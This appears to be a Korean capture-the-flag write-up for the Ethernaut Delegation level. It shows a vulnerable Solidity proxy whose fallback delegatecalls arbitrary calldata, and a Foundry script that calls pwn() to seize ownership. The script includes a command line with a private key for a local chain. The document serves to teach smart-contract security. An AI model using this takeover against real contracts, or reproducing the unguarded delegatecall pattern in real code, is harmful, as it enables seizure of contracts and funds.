# 지문
이 레벨의 목표는 주어진 인스턴스의 **소유권을 획득**하는 것입니다.

도움이 될 수 있는 것들:

* Solidity 문서에서 **delegatecall** 저수준 함수가 어떻게 동작하는지, 그리고 온체인 라이브러리에 작업을 위임하는 방식 및 실행 범위에 어떤 영향을 미치는지 살펴보기
* **폴백(fallback) 메서드**
* **메서드 ID**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

# 풀이 

보통 `fallback` handler에 delegatecall로 특정 contract에 `msg.data`(=calldata)를 전달하는 패턴은 향후에 많이 쓰이는 proxy pattern이라고 불림.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function pwn() external;
    function owner() external view returns (address);
}
contract SolveScript is Script {
    address public target = 0x6A1B3C7624b69000D7848916fb4f42026409586C;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("owner : %s", ITarget(target).owner());
        ITarget(target).pwn();
        console.log("owner after poc : %s", ITarget(target).owner());
        vm.stopBroadcast();
    }
}

```